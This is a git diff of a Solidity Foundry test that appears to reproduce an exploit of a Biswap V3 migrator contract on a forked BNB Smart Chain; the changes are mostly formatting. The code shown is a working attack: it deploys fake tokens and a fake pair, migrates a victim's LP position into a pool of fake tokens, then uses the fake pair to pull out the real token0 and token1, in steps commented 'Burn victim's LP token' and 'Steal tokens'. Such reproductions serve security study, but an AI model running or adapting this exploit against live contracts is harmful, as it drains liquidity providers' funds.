@@ -27,7 +27,7 @@ interface V3Migrator {
         bool refundAsETH;
     }
 
-    function migrate(MigrateParams calldata params) external returns (uint refund0, uint refund1);
+    function migrate(MigrateParams calldata params) external returns (uint256 refund0, uint256 refund1);
 }
 
 interface IBiswapFactoryV3 {
@@ -48,7 +48,7 @@ contract SimpleERC20 {
         _name = name_;
         _symbol = symbol_;
     }
-    
+
     function balanceOf(address account) public view virtual returns (uint256) {
         return _balances[account];
     }
@@ -123,7 +123,6 @@ contract SimpleERC20 {
         _allowances[owner][spender] = amount;
     }
 
-
     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
         uint256 currentAllowance = allowance(owner, spender);
         if (currentAllowance != type(uint256).max) {
@@ -135,27 +134,24 @@ contract SimpleERC20 {
     }
 }
 
-
 contract FakeToken is SimpleERC20 {
-
-    uint token0Amount;
-    uint token1Amount;
+    uint256 token0Amount;
+    uint256 token1Amount;
 
     constructor() SimpleERC20("fake", "fake") {
-        _mint(msg.sender, 10000e18 * 1e18);
+        _mint(msg.sender, 10_000e18 * 1e18);
     }
 }
 
 contract FakePair is SimpleERC20 {
-
-    uint token0Amount;
-    uint token1Amount;
+    uint256 token0Amount;
+    uint256 token1Amount;
 
     constructor() SimpleERC20("fakePair", "fakePair") {
-        _mint(msg.sender, 10000e18 * 1e18);
+        _mint(msg.sender, 10_000e18 * 1e18);
     }
 
-    function update(uint t0, uint t1) external {
+    function update(uint256 t0, uint256 t1) external {
         token0Amount = t0;
         token1Amount = t1;
     }
@@ -166,10 +162,9 @@ contract FakePair is SimpleERC20 {
 }
 
 contract ContractTest is Test {
-
     function setUp() public {
         // fork bsc
-        uint256 forkId = vm.createFork("bsc", 29554461);
+        uint256 forkId = vm.createFork("bsc", 29_554_461);
         vm.selectFork(forkId);
     }
 
@@ -182,24 +177,36 @@ contract ContractTest is Test {
         //0. Preparations: create pool for fake tokens and transfer fake tokens to the migrator
         FakeToken fakeToken0 = new FakeToken();
         FakeToken fakeToken1 = new FakeToken();
-        FakePair fakePair = new FakePair();        
+        FakePair fakePair = new FakePair();
         biswapV3.newPool(address(fakeToken1), address(fakeToken0), 150, 1);
         fakeToken0.transfer(address(migrator), 1e9 * 1e18);
         fakeToken1.transfer(address(migrator), 1e9 * 1e18);
 
-
-        uint liquidityValue = pairToMigrate.balanceOf(victimAddress);
+        uint256 liquidityValue = pairToMigrate.balanceOf(victimAddress);
         emit log_named_uint("liquidity to migrate", liquidityValue);
         IERC20 token0 = IERC20(pairToMigrate.token0());
         IERC20 token1 = IERC20(pairToMigrate.token1());
         assert(token0.balanceOf(address(this)) == 0);
-        
+
         //1. Burn victim's LP token and add liquidity with fake tokens
-        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(address(pairToMigrate), liquidityValue, address(fakeToken1), address(fakeToken0), 150, 10000, 20000, 0, 0, victimAddress, block.timestamp + 1 minutes, false);
+        V3Migrator.MigrateParams memory params = V3Migrator.MigrateParams(
+            address(pairToMigrate),
+            liquidityValue,
+            address(fakeToken1),
+            address(fakeToken0),
+            150,
+            10_000,
+            20_000,
+            0,
+            0,
+            victimAddress,
+            block.timestamp + 1 minutes,
+            false
+        );
         migrator.migrate(params);
 
-        uint token0Balance = token0.balanceOf(address(migrator));
-        uint token1Balance = token1.balanceOf(address(migrator));
+        uint256 token0Balance = token0.balanceOf(address(migrator));
+        uint256 token1Balance = token1.balanceOf(address(migrator));
         fakePair.update(token0Balance, token1Balance);
         emit log_named_decimal_uint("this token0 before", token0.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("this token1 before", token1.balanceOf(address(this)), 18);
@@ -207,7 +214,20 @@ contract ContractTest is Test {
         //2. Steal tokens
         fakePair.transfer(address(this), 1e9 * 1e18);
         fakePair.approve(address(migrator), 1e9 * 1e18);
-        V3Migrator.MigrateParams memory params2 = V3Migrator.MigrateParams(address(fakePair), liquidityValue, address(token0), address(token1), 800, 10000, 20000, 0, 0, address(this), block.timestamp + 1 minutes, false);
+        V3Migrator.MigrateParams memory params2 = V3Migrator.MigrateParams(
+            address(fakePair),
+            liquidityValue,
+            address(token0),
+            address(token1),
+            800,
+            10_000,
+            20_000,
+            0,
+            0,
+            address(this),
+            block.timestamp + 1 minutes,
+            false
+        );
         migrator.migrate(params2);
 
         assert(token0.balanceOf(address(this)) > 1e18);
